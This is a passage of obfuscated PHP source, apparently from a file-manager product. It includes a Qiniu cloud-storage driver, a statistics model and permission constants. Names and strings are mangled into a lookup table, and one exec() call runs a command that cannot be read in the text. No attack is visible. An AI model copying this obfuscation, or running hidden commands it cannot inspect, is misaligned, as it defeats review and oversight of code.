$_SERVER[¹òÍ›æş]; if (!($‰¯˜Õú = $this->link($í‰şîÉ¸))) { return !1; } $æĞøŸ€ë = !1; if ($Ó™öà´Ó > 0) { $ÒŠÊ½Ûí = $ú’âÊ¥˜ + $Ó™öà´Ó - 1; $æĞøŸ€ë = array($‘¶Æ®¢[1445] . $ú’âÊ¥˜ . $‘¶Æ®¢[424] . $ÒŠÊ½Ûí); } $Ääú«ï¥ = url_request($‰¯˜Õú, $‘¶Æ®¢[240], !1, $æĞøŸ€ë); return $Ääú«ï¥[$‘¶Æ®¢[780]] ? $Ääú«ï¥[$‘¶Æ®¢[1229]] : !1; } public function upload($³õ½ØÓ¨, $á§øÊ¥, $±Çòû¨ = false, $ÕŠ¿„ä = REPEAT_REPLACE) { $ÇŞäíºÇ = new Qiniu\Storage\UploadManager(); $š‘àï‚Ô = $this->auth->uploadToken($this->bucket, $³õ½ØÓ¨); $×·‹Š = get_file_mime(get_path_ext($á§øÊ¥)); list($¸¢ÊÓ®, $«Î×ã†Ş) = $ÇŞäíºÇ->putFile($š‘àï‚Ô, $³õ½ØÓ¨, $á§øÊ¥, null, $×·‹Š); return $«Î×ã†Ş ? !1 : $this->getPathOuter($³õ½ØÓ¨); } public function uploadFormData($“ÈäŠ­ë, $øŒÙé»É = 3600) { return $this->uploadToken($“ÈäŠ­ë, $øŒÙé»É); } public function multiUploadFormData($À½ÈÔÂê, $È³šçı´ = 3600) { return $this->uploadToken($À½ÈÔÂê, $È³šçı´); } private function uploadToken($à‰ÆÉ, $İ§šÈÂı = 3600) { $—¥–üÈó =& $_SERVER[¹òÍ›æş]; $ã‡å‹†Ö = $İ§šÈÂı; $á¡Úİ£¤ = array($—¥–üÈó[1446] => $—¥–üÈó[1447]); $Ş´µîë§ = $à‰ÆÉ; $á¨„Íö = $this->auth->uploadToken($this->bucket, $Ş´µîë§, $ã‡å‹†Ö, $á¡Úİ£¤, !0); $Õõ°ÓìÇ = empty($this->region) || $this->region == $—¥–üÈó[1448] ? $—¥–üÈó[12] : $—¥–üÈó[424] . $this->region; $Û€òÂ¼¾ = http_type() . "\72\x2f\x2f\165\x70\x6c\157\x61\x64{$Õõ°ÓìÇ}\x2e\161\151\156\x69\x75\x70\x2e\143\157\155\57"; return array($—¥–üÈó[1449] => $á¨„Íö, $—¥–üÈó[1450] => $Û€òÂ¼¾); } public function download($úÓ¹œ‹¹, $ğÏŒñÏ¯) { $‘³©û¸“ = IO::getPathInner(IO::mkfile($ğÏŒñÏ¯)); if (!($Øöù¸ı¯ = $this->link($úÓ¹œ‹¹))) { return !1; } $±±€¢ã = 0; $Œë¬ÏòÈ = 1024 * 200; $Üç¿ã = fopen($‘³©û¸“, $_SERVER[¹òÍ›æş][1451]); while (!0) { $À‰àÛÆè = $this->fileSubstr($úÓ¹œ‹¹, $±±€¢ã, $Œë¬ÏòÈ); if ($À‰àÛÆè === !1) { return !1; } fwrite($Üç¿ã, $À‰àÛÆè); $±±€¢ã += $Œë¬ÏòÈ; if (strlen($À‰àÛÆè) < $Œë¬ÏòÈ) { break; } } fclose($Üç¿ã); return $ğÏŒñÏ¯; } public function link($şæÒ€½…, $é‡Ö‚¬š = '') { if (!$this->isFile($şæÒ€½…)) { return !1; } $€‹¤§İ = $this->getHost() . $_SERVER[¹òÍ›æş][8] . $this->pathEncode($şæÒ€½…) . $é‡Ö‚¬š; return $this->auth->privateDownloadUrl($€‹¤§İ, 3600 * 12); } public function fileOut($Ï£‹¦, $èÍôÂ€ = false, $€Áò”²° = false, $ó‹Ÿ˜ç° = '') { $Ÿàƒ¡½• =& $_SERVER[¹òÍ›æş]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ï£‹¦, $èÍôÂ€, $€Áò”²°, $ó‹Ÿ˜ç°); } if (!$€Áò”²°) { $€Áò”²° = $this->pathThis($Ï£‹¦); } $‰÷…¼€à = $èÍôÂ€ ? $Ÿàƒ¡½•[1452] . rawurlencode($€Áò”²°) : $Ÿàƒ¡½•[12]; $¿óËÒİñ = $this->link($Ï£‹¦, $‰÷…¼€à); $this->fileOutLink($¿óËÒİñ); } public function fileOutServer($¯äõıîÅ, $¾½¨ãÌ = false, $¯•‰¿™ = false, $ÛÉƒÎ»š = '') { parent::fileOut($¯äõıîÅ, $¾½¨ãÌ, $¯•‰¿™, $ÛÉƒÎ»š); } public function fileOutImage($Î¨Ë¢ëû, $ÙÒ¥Çìì = 250) { $ğ‹Ó«£¨ = $this->link($Î¨Ë¢ëû, $_SERVER[¹òÍ›æş][1453] . $ÙÒ¥Çìì); $this->fileOutLink($ğ‹Ó«£¨); } public function fileOutImageServer($ÁºßÎö, $”«ï½€Ï = 250) { parent::fileOutImage($ÁºßÎö, $”«ï½€Ï); } public function hashMd5($È›²º¶‘) { $ÀÃíŠ²¢ =& $_SERVER[¹òÍ›æş]; $ûÎ¦ğß = $this->objectMeta($È›²º¶‘); return isset($ûÎ¦ğß[$ÀÃíŠ²¢[222]]) ? $ûÎ¦ğß[$ÀÃíŠ²¢[222]] : !1; $„¥ú‡¤¥ = $this->link($È›²º¶‘, $ÀÃíŠ²¢[1454]); } public function size($ÚàãÌæµ) { $•ÎĞ‰Ñ = $this->objectMeta($ÚàãÌæµ); return $•ÎĞ‰Ñ ? $•ÎĞ‰Ñ[$_SERVER[¹òÍ›æş][86]] : 0; } public function info($¡êíé™) { if ($this->isFolder($¡êíé™)) { return $this->folderInfo($¡êíé™); } else { if ($this->isFile($¡êíé™)) { return $this->fileInfo($¡êíé™); } } return !1; } public function exist($¡¸±ùŞ‘) { return $this->isFile($¡¸±ùŞ‘) || $this->isFolder($¡¸±ùŞ‘); } public function isFile($Ãğòû¹÷) { return !$this->isFolder($Ãğòû¹÷) && $this->objectMeta($Ãğòû¹÷); } public function isFolder($›ü¿ğÕÚ) { return $this->cacheMethod($_SERVER[¹òÍ›æş][175], $›ü¿ğÕÚ); } protected function objectMeta($İÚ¿Ï¸) { return $this->cacheMethod($_SERVER[¹òÍ›æş][177], $İÚ¿Ï¸); } protected function _objectMeta($½õ¡ƒ¸¡) { $´ÕÒµæà =& $_SERVER[¹òÍ›æş]; list($Óâü“ö†, $Û—æ­ô·) = $this->bucketManager->stat($this->bucket, $½õ¡ƒ¸¡); if ($Óâü“ö†) { $Óâü“ö†[$´ÕÒµæà[86]] = intval($Óâü“ö†[$´ÕÒµæà[1440]]); } return $Óâü“ö†; } protected function _isFolder($€åØ¶Îù) { $ıµûãÒÙ =& $_SERVER[¹òÍ›æş]; if ($€åØ¶Îù == $ıµûãÒÙ[12] || $€åØ¶Îù == $ıµûãÒÙ[8]) { return !0; } list($â•ıŸÂ¾, $¹„ı¢‘ã) = $this->bucketManager->listFiles($this->bucket, trim($€åØ¶Îù, $ıµûãÒÙ[8]) . $ıµûãÒÙ[8], $ıµûãÒÙ[12], 1, $ıµûãÒÙ[8]); return !empty($â•ıŸÂ¾[$ıµûãÒÙ[1443]]) || !empty($â•ıŸÂ¾[$ıµûãÒÙ[1444]]) ? !0 : !1; } } goto a«¬¦ôñßö; f™—è´öÖù: class AnalysisModel extends ModelBaseLight { public function init($ğÚ²—Ç) { $Ø‘–×­¯ =& $_SERVER[¹òÍ›æş]; $®À®‡Àº = array($Ø‘–×­¯[628] => array($Ø‘–×­¯[33] => $Ø‘–×­¯[1788], $Ø‘–×­¯[311] => array($Ø‘–×­¯[234], $Ø‘–×­¯[795], $Ø‘–×­¯[1789], $Ø‘–×­¯[1790])), $Ø‘–×­¯[1791] => array($Ø‘–×­¯[33] => $Ø‘–×­¯[1792], $Ø‘–×­¯[311] => array($Ø‘–×­¯[234], $Ø‘–×­¯[793], $Ø‘–×­¯[1793], $Ø‘–×­¯[1794], $Ø‘–×­¯[1795]))); if (!isset($®À®‡Àº[$ğÚ²—Ç])) { return !1; } $this->optionType = $®À®‡Àº[$ğÚ²—Ç][$Ø‘–×­¯[33]]; $this->field = $®À®‡Àº[$ğÚ²—Ç][$Ø‘–×­¯[311]]; return !0; } public function listData($›†úÏ÷ = false, $öêíÍ— = "\x6d\x6f\x64\151\x66\x79\x54\x69\155\x65", $Ò‚„èÏ³ = false) { return parent::listData($›†úÏ÷, $öêíÍ—, $Ò‚„èÏ³); } public function trendList($…¦Ö·æ) { $¨²áÛ¼› =& $_SERVER[¹òÍ›æş]; $öÌÆÑÁâ = $this->listData(); if ($öÌÆÑÁâ) { $ñáà­´ê = end($öÌÆÑÁâ); $øí¶• = date($¨²áÛ¼›[1796], strtotime($¨²áÛ¼›[1797])); if ($ñáà­´ê[$¨²áÛ¼›[234]] == $øí¶•) { return $öÌÆÑÁâ; } $í—¶É²© = strtotime($ñáà­´ê[$¨²áÛ¼›[234]]); } if (!isset($í—¶É²©)) { $²ÕıÂ” = $…¦Ö·æ == $¨²áÛ¼›[628] ? $¨²áÛ¼›[563] : $¨²áÛ¼›[855]; $í—¶É²© = Model($²ÕıÂ”)->min($¨²áÛ¼›[211]); } $¨ŠÎ¢´× = $¨²áÛ¼›[1798] . ucfirst($…¦Ö·æ); $®í“äìÇ = $this->dateList($í—¶É²©); foreach ($®í“äìÇ as $øí¶•) { $this->{$¨ŠÎ¢´×}($øí¶•); } return $this->listData(); } private function dateList($Õ€ƒÇ…†) { $Ì†É¹« =& $_SERVER[¹òÍ›æş]; $È•ñ ¹ó = $Õ€ƒÇ…†; $ƒ‰×¯š = strtotime($Ì†É¹«[1797]); $¬»ù®ó« = array(); while ($È•ñ ¹ó <= $ƒ‰×¯š) { $¬»ù®ó«[] = date($Ì†É¹«[1796], $È•ñ ¹ó); $È•ñ ¹ó = strtotime($Ì†É¹«[1799], $È•ñ ¹ó); } return $¬»ù®ó«; } public function _recordUser($®‘ÜÏàü = '') { $Ä²ÉéîÃ =& $_SERVER[¹òÍ›æş]; $Çæ­Åö¶ = strtotime(date($Ä²ÉéîÃ[1800], strtotime($®‘ÜÏàü))); $‚”¢ÛÌÌ = strtotime(date($Ä²ÉéîÃ[1801], strtotime($®‘ÜÏàü))); $÷‰·öº = array($Ä²ÉéîÃ[211] => array($Ä²ÉéîÃ[1040], $‚”¢ÛÌÌ)); $šš¨¼ü‡ = Model($Ä²ÉéîÃ[563])->where($÷‰·öº)->count($Ä²ÉéîÃ[1669]); $÷‰·öº[$Ä²ÉéîÃ[211]] = array($Ä²ÉéîÃ[371], array($Çæ­Åö¶, $‚”¢ÛÌÌ)); $ùµúã×· = Model($Ä²ÉéîÃ[563])->where($÷‰·öº)->count($Ä²ÉéîÃ[1669]); $÷‰·öº[$Ä²ÉéîÃ[33]] = $Ä²ÉéîÃ[1802]; $ØÜšÓèæ = Model($Ä²ÉéîÃ[1803])->where($÷‰·öº)->count($Ä²ÉéîÃ[1804]); $ôòõÕ¿Ò = array($Ä²ÉéîÃ[234] => $®‘ÜÏàü, $Ä²ÉéîÃ[795] => (int) $šš¨¼ü‡, $Ä²ÉéîÃ[1789] => (int) $ùµúã×·, $Ä²ÉéîÃ[1790] => (int) $ØÜšÓèæ); return $this->insert($ôòõÕ¿Ò); } public function _recordStore($òºøæó¦ = '') { $ŠÀ‘‘¶† =& $_SERVER[¹òÍ›æş]; $±ÖÏÏÒ = strtotime(date($ŠÀ‘‘¶†[1801], strtotime($òºøæó¦))); $üï² = array($ŠÀ‘‘¶†[211] => array($ŠÀ‘‘¶†[1040], $±ÖÏÏÒ)); $ı×ë¹â¥ = Model($ŠÀ‘‘¶†[509])->where($üï²)->sum($ŠÀ‘‘¶†[86]); $üï²[$ŠÀ‘‘¶†[448]] = 0; $À‚‘Ã¶ï = Model($ŠÀ‘‘¶†[855])->where($üï²)->sum($ŠÀ‘‘¶†[86]); $üï²[$ŠÀ‘‘¶†[449]] = 1; $Æ¬Îİ„¬ = Model($ŠÀ‘‘¶†[855])->where($üï²)->sum($ŠÀ‘‘¶†[86]); $üï²[$ŠÀ‘‘¶†[449]] = 2; $™†¾€ÆĞ = Model($ŠÀ‘‘¶†[855])->where($üï²)->sum($ŠÀ‘‘¶†[86]); $„¨±Šƒ‰ = array($ŠÀ‘‘¶†[234] => $òºøæó¦, $ŠÀ‘‘¶†[793] => (int) $À‚‘Ã¶ï, $ŠÀ‘‘¶†[1793] => (int) $ı×ë¹â¥, $ŠÀ‘‘¶†[1794] => (int) $Æ¬Îİ„¬, $ŠÀ‘‘¶†[1795] => (int) $™†¾€ÆĞ); return $this->insert($„¨±Šƒ‰); } public function trend($‚õíàîŠ, $¦ÜÕş…·) { $ÉŒ‘¾†¬ =& $_SERVER[¹òÍ›æş]; if (!$this->init($‚õíàîŠ)) { return !1; } $‰í°½§· = $this->trendList($‚õíàîŠ); if ($‰í°½§· && $¦ÜÕş…· != $ÉŒ‘¾†¬[1642]) { $Ü©ƒÌÙÉ = $‰í°½§·[0][$ÉŒ‘¾†¬[234]]; $˜úóÌŸ = $this->validDate($¦ÜÕş…·, $Ü©ƒÌÙÉ); $øş–“õ = array(); $ñ€¾ˆß = array_to_keyvalue($‰í°½§·, $ÉŒ‘¾†¬[234]); foreach ($˜úóÌŸ as $âó››­˜) { if (isset($ñ€¾ˆß[$âó››­˜])) { $ÉŸ‚œ£ƒ = $ñ€¾ˆß[$âó››­˜]; } else { $ÉŸ‚œ£ƒ = end($‰í°½§·); $ÉŸ‚œ£ƒ[$ÉŒ‘¾†¬[234]] = $âó››­˜; if ($‚õíàîŠ == $ÉŒ‘¾†¬[628]) { $ÉŸ‚œ£ƒ[$ÉŒ‘¾†¬[1789]] = $ÉŸ‚œ£ƒ[$ÉŒ‘¾†¬[1790]] = 0; } } $øş–“õ[] = $ÉŸ‚œ£ƒ; } $‰í°½§· = $øş–“õ; } $×ƒŒ–å = array($ÉŒ‘¾†¬[628] => array($ÉŒ‘¾†¬[795] => LNG($ÉŒ‘¾†¬[1805]), $ÉŒ‘¾†¬[1789] => LNG($ÉŒ‘¾†¬[1806]), $ÉŒ‘¾†¬[1790] => LNG($ÉŒ‘¾†¬[1807])), $ÉŒ‘¾†¬[1791] => array($ÉŒ‘¾†¬[793] => LNG($ÉŒ‘¾†¬[1808]), $ÉŒ‘¾†¬[1793] => LNG($ÉŒ‘¾†¬[1809]), $ÉŒ‘¾†¬[1794] => LNG($ÉŒ‘¾†¬[1810]), $ÉŒ‘¾†¬[1795] => LNG($ÉŒ‘¾†¬[1811]))); $şõıÚ¦£ = array($ÉŒ‘¾†¬[628] => $ÉŒ‘¾†¬[1812], $ÉŒ‘¾†¬[1791] => $ÉŒ‘¾†¬[86]); if (empty($‰í°½§·)) { $âó››­˜ = date($ÉŒ‘¾†¬[1796], strtotime($ÉŒ‘¾†¬[1797])); $íâôœ¬³ = array($ÉŒ‘¾†¬[234] => $âó››­˜); foreach ($×ƒŒ–å[$‚õíàîŠ] as $º°ôœœá => $ŠËˆŸä©) { $íâôœ¬³[$º°ôœœá] = 0; } $‰í°½§·[] = $íâôœ¬³; } $¸ Úƒ‰‘ = array(); foreach ($‰í°½§· as $ŠËˆŸä©) { if ($‚õíàîŠ == $ÉŒ‘¾†¬[1791] && $ŠËˆŸä©[$ÉŒ‘¾†¬[1793]] > $ŠËˆŸä©[$ÉŒ‘¾†¬[793]]) { $ŠËˆŸä©[$ÉŒ‘¾†¬[1793]] = $ŠËˆŸä©[$ÉŒ‘¾†¬[793]]; } foreach ($×ƒŒ–å[$‚õíàîŠ] as $º°ôœœá => $æ²‘“Òø) { $ÉŸ‚œ£ƒ = array($ÉŒ‘¾†¬[234] => $ŠËˆŸä©[$ÉŒ‘¾†¬[234]], $ÉŒ‘¾†¬[1569] => $æ²‘“Òø); $ÉŸ‚œ£ƒ[$şõıÚ¦£[$‚õíàîŠ]] = isset($ŠËˆŸä©[$º°ôœœá]) ? $ŠËˆŸä©[$º°ôœœá] : 0; $¸ Úƒ‰‘[] = $ÉŸ‚œ£ƒ; } } return $¸ Úƒ‰‘; } public function validDate($²æèÛ¶Š, $Ø©¡·í) { $Œß‰Œæ =& $_SERVER[¹òÍ›æş]; $ã…Œû‹º = date($Œß‰Œæ[1796], strtotime($Œß‰Œæ[1797])); $¦ÒËİÓ½ = array($ã…Œû‹º); switch ($²æèÛ¶Š) { case $Œß‰Œæ[1649]: $œ¼Ç‘ı„ = mktime(0, 0, 0, date($Œß‰Œæ[1813]), date($Œß‰Œæ[1388]) - date($Œß‰Œæ[1451]) + 7 - 7, date($Œß‰Œæ[1814])); $ëÍ“‡Ë¼ = 0; do { $§¸‡Ü·ê = date($Œß‰Œæ[1796], $œ¼Ç‘ı„ - 3600 * 24 * 7 * $ëÍ“‡Ë¼); $¦ÒËİÓ½[] = $§¸‡Ü·ê; $ëÍ“‡Ë¼++; } while ($Ø©¡·í < $§¸‡Ü·ê); break; case $Œß‰Œæ[1647]: $ëÍ“‡Ë¼ = 1; do { $™å¼é÷’ = date($Œß‰Œæ[1815], strtotime("\x2d\x20{$ëÍ“‡Ë¼}\40\x6d\157\x6e\x74\150\163")); $¦ÒËİÓ½[] = $™å¼é÷’; $ëÍ“‡Ë¼++; } while ($Ø©¡·í < $™å¼é÷’); break; case $Œß‰Œæ[1816]: $¯·ƒ÷éŠ = (int) date($Œß‰Œæ[1814], strtotime($Ø©¡·í)); $¾û’û = (int) date($Œß‰Œæ[1814]); if ($¯·ƒ÷éŠ >= $¾û’û) { break; } for ($¯·ƒ÷éŠ; $¯·ƒ÷éŠ < $¾û’û; $¯·ƒ÷éŠ++) { $¦ÒËİÓ½[] = $¯·ƒ÷éŠ . $Œß‰Œæ[1817]; } break; default: break; } if ($Ø©¡·í > end($¦ÒËİÓ½)) { array_pop($¦ÒËİÓ½); } sort($¦ÒËİÓ½); return $¦ÒËİÓ½; } public function listTable($Ñ÷øİ…Ú) { $ á´šÓÀ = ucfirst($Ñ÷øİ…Ú); return Model($ á´šÓÀ)->listData(); } public function option($¡¾ë¾Œ) { $î‚’é× = $_SERVER[¹òÍ›æş][1818] . ucfirst($¡¾ë¾Œ); return $this->{$î‚’é×}(); } private function optionUser() { $‰‡ú‘ÀÎ =& $_SERVER[¹òÍ›æş]; $Í¦öÕ÷ç = Model($‰‡ú‘ÀÎ[563])->count($‰‡ú‘ÀÎ[1669]); $µ¶º¹ç³ = Model($‰‡ú‘ÀÎ[563])->where($‰‡ú‘ÀÎ[1819])->count($‰‡ú‘ÀÎ[1669]); $²™Ñ¡¢ = intval($GLOBALS[$‰‡ú‘ÀÎ[6]][$‰‡ú‘ÀÎ[387]][$‰‡ú‘ÀÎ[1624]]) / 3600; $¢‚ÑÂ¤í = strtotime("\55{$²™Ñ¡¢}\40\x68\157\165\162\163"); $¶œˆ–ÇØ = strtotime(date($‰‡ú‘ÀÎ[1800])); if ($¢‚ÑÂ¤í < $¶œˆ–ÇØ) { $¢‚ÑÂ¤í = $¶œˆ–ÇØ; } $ö¿²ü˜ƒ = array($‰‡ú‘ÀÎ[1820] => array($‰‡ú‘ÀÎ[1041], $¢‚ÑÂ¤í)); $¬¸Æ¢Ä = (int) Model($‰‡ú‘ÀÎ[563])->where($ö¿²ü˜ƒ)->count($‰‡ú‘ÀÎ[1669]); if (!$¬¸Æ¢Ä) { $¬¸Æ¢Ä = 1; } $ö¿²ü˜ƒ = array($‰‡ú‘ÀÎ[1820] => array($‰‡ú‘ÀÎ[1041], $¶œˆ–ÇØ)); $İúúÎŸ¿ = Model($‰‡ú‘ÀÎ[563])->where($ö¿²ü˜ƒ)->count($‰‡ú‘ÀÎ[1669]); return array($‰‡ú‘ÀÎ[788] => (int) $Í¦öÕ÷ç, $‰‡ú‘ÀÎ[1821] => (int) ($Í¦öÕ÷ç - $µ¶º¹ç³), $‰‡ú‘ÀÎ[1822] => (int) $µ¶º¹ç³, $‰‡ú‘ÀÎ[1823] => (int) $İúúÎŸ¿, $‰‡ú‘ÀÎ[1824] => $¬¸Æ¢Ä); } private function optionFile() { $à›ŠÒè¥ =& $_SERVER[¹òÍ›æş]; $©êêÁØĞ = $this->sourceSize(); $«ÜÃ¸Äó = $©êêÁØĞ[$à›ŠÒè¥[86]]; $É«Óõ×Â = $©êêÁØĞ[$à›ŠÒè¥[1793]]; $ä—„è¼Ö = Model($à›ŠÒè¥[855])->where(array($à›ŠÒè¥[448] => 0))->count($à›ŠÒè¥[440]); $è‚ü ‹Ô = array($à›ŠÒè¥[448] => 0, $à›ŠÒè¥[211] => array($à›ŠÒè¥[1041], strtotime(date($à›ŠÒè¥[1800])))); $–øÂ°ƒë = Model($à›ŠÒè¥[855])->where($è‚ü ‹Ô)->sum($à›ŠÒè¥[86]); $ãê”ÑŞ» = Model($à›ŠÒè¥[855])->where($è‚ü ‹Ô)->count($à›ŠÒè¥[440]); return array($à›ŠÒè¥[793] => $«ÜÃ¸Äó, $à›ŠÒè¥[1793] => $É«Óõ×Â, $à›ŠÒè¥[1825] => $«ÜÃ¸Äó - $É«Óõ×Â, $à›ŠÒè¥[1826] => (int) $–øÂ°ƒë, $à›ŠÒè¥[795] => (int) $ä—„è¼Ö, $à›ŠÒè¥[1827] => (int) $ãê”ÑŞ»); } private function optionAccess() { $‚†ÃÉ–… =& $_SERVER[¹òÍ›æş]; return array($‚†ÃÉ–…[788] => $this->typeLogCnt(), $‚†ÃÉ–…[117] => $this->typeLogCnt($‚†ÃÉ–…[117]), $‚†ÃÉ–…[490] => $this->typeLogCnt($‚†ÃÉ–…[490]), $‚†ÃÉ–…[1828] => $this->typeLogCnt($‚†ÃÉ–…[1828]), $‚†ÃÉ–…[1829] => $this->typeLogCnt($‚†ÃÉ–…[1829]), $‚†ÃÉ–…[628] => $this->typeLogCnt($‚†ÃÉ–…[12], $‚†ÃÉ–…[1804])); } private function typeLogCnt($áÌùÇİ’ = '', $Ã¬¯ŞÔå = "\x69\144") { $¶µó×‚• =& $_SERVER[¹òÍ›æş]; $œş¬ƒœè = array($¶µó×‚•[117] => array($¶µó×‚•[1830], $¶µó×‚•[1831]), $¶µó×‚•[490] => array($¶µó×‚•[1832], $¶µó×‚•[1833]), $¶µó×‚•[1828] => array($¶µó×‚•[1834], $¶µó×‚•[1835], $¶µó×‚•[1836]), $¶µó×‚•[1829] => array($¶µó×‚•[1837], $¶µó×‚•[1838]), $¶µó×‚•[1839] => array($¶µó×‚•[1840], $¶µó×‚•[1841], $¶µó×‚•[1842])); $¤µâ¾ã = strtotime(date($¶µó×‚•[1800])); $ãùÃØÆ = array($¶µó×‚•[211] => array($¶µó×‚•[1041], $¤µâ¾ã)); if ($áÌùÇİ’) { $ãùÃØÆ[$¶µó×‚•[33]] = array($¶µó×‚•[7], $œş¬ƒœè[$áÌùÇİ’]); } $—Öıí€Ä = Model($¶µó×‚•[1803])->where($ãùÃØÆ)->count($Ã¬¯ŞÔå); return (int) $—Öıí€Ä; } private function optionServer() { $õÂÌÑÎß =& $_SERVER[¹òÍ›æş]; $—¹ëÓû‚ = $this->diskDriver(); $ìÕèåû = KodIO::defaultDriver(); $Õº–‚ç» = array($õÂÌÑÎß[847] => $ìÕèåû[$õÂÌÑÎß[437]]); $¦ı¢•âë = Model($õÂÌÑÎß[509])->where($Õº–‚ç»)->sum($õÂÌÑÎß[86]); $…çâÏ¼˜ = explode($õÂÌÑÎß[53], $_SERVER[$õÂÌÑÎß[153]]); $è¤Ù ™‡ = $…çâÏ¼˜[0]; $ï‡Á° = $GLOBALS[$õÂÌÑÎß[6]][$õÂÌÑÎß[21]]; $ÓöÄ›è£ = $ï‡Á°[$õÂÌÑÎß[1003]]; if ($ÓöÄ›è£ == $õÂÌÑÎß[991]) { $‚È‰óÛ» = explode($õÂÌÑÎß[1309], $ï‡Á°[$õÂÌÑÎß[1002]]); $ÓöÄ›è£ = $‚È‰óÛ»[0]; } if ($ÓöÄ›è£ == $õÂÌÑÎß[939] || $ÓöÄ›è£ == $õÂÌÑÎß[834]) { $ñÖü¥°ô = Model()->db()->query($õÂÌÑÎß[1843]); $Ÿúè×íš = $ñÖü¥°ô[0] && isset($ñÖü¥°ô[0][$õÂÌÑÎß[1568]]) ? $ñÖü¥°ô[0][$õÂÌÑÎß[1568]] : 0; $ÓöÄ›è£ = $õÂÌÑÎß[1844] . ($Ÿúè×íš ? $õÂÌÑÎß[8] . $Ÿúè×íš : $õÂÌÑÎß[12]); } $›çÜºç¹ = $GLOBALS[$õÂÌÑÎß[6]][$õÂÌÑÎß[387]][$õÂÌÑÎß[857]]; return array($õÂÌÑÎß[1845] => $—¹ëÓû‚ ? $—¹ëÓû‚[$õÂÌÑÎß[1846]] : 0, $õÂÌÑÎß[1847] => $—¹ëÓû‚ ? $—¹ëÓû‚[$õÂÌÑÎß[1848]] : 0, $õÂÌÑÎß[1849] => (int) $ìÕèåû[$õÂÌÑÎß[1846]] * 1024 * 1024 * 1024, $õÂÌÑÎß[1850] => (int) $¦ı¢•âë, $õÂÌÑÎß[1851] => ucfirst($è¤Ù ™‡), $õÂÌÑÎß[1852] => $õÂÌÑÎß[1853] . PHP_VERSION, $õÂÌÑÎß[1854] => phpBuild64() ? 64 : 32, $õÂÌÑÎß[787] => str_replace($õÂÌÑÎß[1157], $õÂÌÑÎß[1019], $ÓöÄ›è£), $õÂÌÑÎß[387] => ucfirst($›çÜºç¹), $õÂÌÑÎß[32] => $_SERVER[$õÂÌÑÎß[1855]]); } private function diskDriver() { $×Ğèñ¨ï =& $_SERVER[¹òÍ›æş]; $¥­ùéó = $×Ğèñ¨ï[8]; $øı€ç²Ú = $GLOBALS[$×Ğèñ¨ï[6]][$×Ğèñ¨ï[1326]] == $×Ğèñ¨ï[1327]; if ($øı€ç²Ú) { $¥­ùéó = $×Ğèñ¨ï[1856]; if (function_exists($×Ğèñ¨ï[1857])) { exec($×Ğèñ¨ï[1858], $Ó£‹·¹); $¥­ùéó = $Ó£‹·¹[1] . $×Ğèñ¨ï[8]; } } if (!file_exists($¥­ùéó)) { return; } $éä”ÒûØ = @disk_total_space($¥­ùéó); $Ş÷©ÜÜ“ = $éä”ÒûØ - @disk_free_space($¥­ùéó); return array($×Ğèñ¨ï[1846] => $éä”ÒûØ, $×Ğèñ¨ï[1848] => $Ş÷©ÜÜ“); } public function fileChart($†äèì“) { $å™İ¹±– =& $_SERVER[¹òÍ›æş]; if (isset($†äèì“[$å™İ¹±–[1669]])) { return Model($å™İ¹±–[855])->userFileTypeProfile($†äèì“[$å™İ¹±–[1669]]); } if (isset($†äèì“[$å™İ¹±–[1859]])) { return Model($å™İ¹±–[855])->groupFileTypeProfile($†äèì“[$å™İ¹±–[1859]]); } $ºíßÎÂ× = $this->sourceSize(); $Çõ¾·Í´ = array($å™İ¹±–[470] => 0, $å™İ¹±–[449] => 1); $§¡±”¦° = Model($å™İ¹±–[855])->where($Çõ¾·Í´)->sum($å™İ¹±–[86]); $Çõ¾·Í´[$å™İ¹±–[449]] = 2; $Üıî¶ú = Model($å™İ¹±–[855])->where($Çõ¾·Í´)->sum($å™İ¹±–[86]); return array($å™İ¹±–[793] => $ºíßÎÂ×[$å™İ¹±–[86]], $å™İ¹±–[1793] => $ºíßÎÂ×[$å™İ¹±–[1793]], $å™İ¹±–[1794] => (int) $§¡±”¦°, $å™İ¹±–[1795] => (int) $Üıî¶ú); } private function sourceSize() { $¸˜ËƒÙ¶ =& $_SERVER[¹òÍ›æş]; $†­™Ÿ´Ò = Model($¸˜ËƒÙ¶[855])->where(array($¸˜ËƒÙ¶[448] => 0))->sum($¸˜ËƒÙ¶[86]); $±§®½Üã = Model($¸˜ËƒÙ¶[509])->sum($¸˜ËƒÙ¶[86]); if ($±§®½Üã > $†­™Ÿ´Ò) { $±§®½Üã = $†­™Ÿ´Ò; } return array($¸˜ËƒÙ¶[86] => (int) $†­™Ÿ´Ò, $¸˜ËƒÙ¶[1793] => (int) $±§®½Üã); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ÇÄÑŠùç =& $_SERVER[¹òÍ›æş]; $±°Ì“Œá = array(array($ÇÄÑŠùç[458] => LNG($ÇÄÑŠùç[1860]), $ÇÄÑŠùç[1861] => $ÇÄÑŠùç[1862], $ÇÄÑŠùç[1863] => 1, $ÇÄÑŠùç[1864] => 1, $ÇÄÑŠùç[1865] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÇÄÑŠùç[458] => LNG($ÇÄÑŠùç[1866]), $ÇÄÑŠùç[1861] => $ÇÄÑŠùç[1867], $ÇÄÑŠùç[1863] => 2, $ÇÄÑŠùç[1864] => 1, $ÇÄÑŠùç[1865] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÇÄÑŠùç[458] => LNG($ÇÄÑŠùç[1868]), $ÇÄÑŠùç[1861] => $ÇÄÑŠùç[1869], $ÇÄÑŠùç[1863] => 3, $ÇÄÑŠùç[1864] => 1, $ÇÄÑŠùç[1865] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÇÄÑŠùç[458] => 